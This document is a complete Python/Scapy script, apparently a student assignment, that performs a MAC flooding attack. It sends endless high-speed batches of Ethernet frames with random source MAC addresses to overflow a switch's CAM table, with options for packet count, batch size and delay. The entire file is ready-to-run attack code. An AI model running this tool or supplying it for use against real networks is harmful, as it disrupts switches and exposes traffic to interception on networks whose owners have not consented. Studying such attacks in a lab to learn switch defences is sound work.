#!/usr/bin/env python3
# ==============================================================================
#  MAC FLOODING ATTACK — OPTIMIZADO (alta velocidad)
#  Autor     : Junior Javier Santos Perez
#  Matricula : 2024-1599
# ==============================================================================

import argparse
import random
import sys
import os
import time
import signal
from threading import Thread, Event

try:
    from scapy.all import Ether, sendpfast, conf, get_if_hwaddr
except ImportError:
    print("[!] Scapy no encontrado. Instala con: pip install scapy")
    sys.exit(1)

stop_event = Event()
stats = {"enviados": 0, "inicio": None}

def mac_aleatoria():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(6))

def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       MAC FLOODING — SWITCH CAM TABLE OVERFLOW v2.0         ║
║  Autor     : Junior Javier Santos Perez                      ║
║  Matricula : 2024-1599                                       ║
╚══════════════════════════════════════════════════════════════╝
""")

def mostrar_stats(intervalo=1):
    while not stop_event.is_set():
        time.sleep(intervalo)
        if stats["inicio"]:
            elapsed = time.time() - stats["inicio"]
            pps = stats["enviados"] / elapsed if elapsed > 0 else 0
            print(f"\r[*] Enviados: {stats['enviados']:,}  |  "
                  f"Velocidad: {pps:,.0f} pkt/s  |  "
                  f"Tiempo: {elapsed:.1f}s     ", end="", flush=True)

def handler_salida(sig, frame):
    print("\n\n[!] Interrupción recibida. Deteniendo...")
    stop_event.set()

def generar_lote(tam=1000):
    """Genera un lote de paquetes con MACs aleatorias."""
    paquetes = []
    for _ in range(tam):
        pkt = Ether(src=mac_aleatoria(), dst="ff:ff:ff:ff:ff:ff")
        paquetes.append(pkt)
    return paquetes

def mac_flooding(interfaz, cantidad, delay, lote_size):
    signal.signal(signal.SIGINT, handler_salida)

    print(f"[*] Interfaz      : {interfaz}")
    print(f"[*] Cantidad      : {'Infinito' if cantidad == 0 else f'{cantidad:,}'}")
    print(f"[*] Tamaño lote   : {lote_size:,} paquetes por ráfaga")
    print(f"[*] Modo          : {'Máxima velocidad (sendpfast)' if delay == 0 else f'Controlado ({delay}s delay)'}")
    print("─" * 62)
    print("[*] Iniciando ataque... Presiona Ctrl+C para detener.\n")

    hilo_stats = Thread(target=mostrar_stats, daemon=True)
    hilo_stats.start()

    stats["inicio"] = time.time()
    conf.verb = 0
    enviados = 0

    while not stop_event.is_set():
        # Calcular cuántos generar en este lote
        if cantidad > 0:
            restantes = cantidad - enviados
            if restantes <= 0:
                break
            tam = min(lote_size, restantes)
        else:
            tam = lote_size

        lote = generar_lote(tam)

        try:
            # sendpfast usa tcpreplay internamente — MUCHO más rápido
            sendpfast(lote, iface=interfaz, mbps=100, loop=0)
        except Exception:
            # Fallback a sendp normal si sendpfast falla
            try:
                from scapy.all import sendp
                sendp(lote, iface=interfaz, verbose=False, inter=0)
            except Exception as e:
                print(f"\n[!] Error: {e}")
                break

        enviados += tam
        stats["enviados"] = enviados

        if cantidad > 0 and enviados >= cantidad:
            print(f"\n[✓] Meta alcanzada: {enviados:,} paquetes enviados.")
            break

        if delay > 0:
            time.sleep(delay)

    stop_event.set()
    elapsed = time.time() - stats["inicio"]
    pps_final = enviados / elapsed if elapsed > 0 else 0

    print(f"\n\n{'─'*62}")
    print(f"[✓] Ataque finalizado.")
    print(f"    Paquetes enviados : {enviados:,}")
    print(f"    Tiempo total      : {elapsed:.2f}s")
    print(f"    Velocidad media   : {pps_final:,.0f} pkt/s")
    print(f"{'─'*62}")

def parse_args():
    parser = argparse.ArgumentParser(description="MAC Flooding optimizado")
    parser.add_argument("-i", "--interfaz", default="eth0")
    parser.add_argument("-c", "--cantidad", type=int, default=0,
                        help="Paquetes a enviar (0=infinito)")
    parser.add_argument("-d", "--delay", type=float, default=0)
    parser.add_argument("-l", "--lote", type=int, default=1000,
                        help="Tamaño del lote por ráfaga (default: 1000)")
    return parser.parse_args()

if __name__ == "__main__":
    banner()
    if os.geteuid() != 0:
        print("[!] Requiere root: sudo python3 mac_flooding.py")
        sys.exit(1)
    args = parse_args()
    mac_flooding(args.interfaz, args.cantidad, args.delay, args.lote)
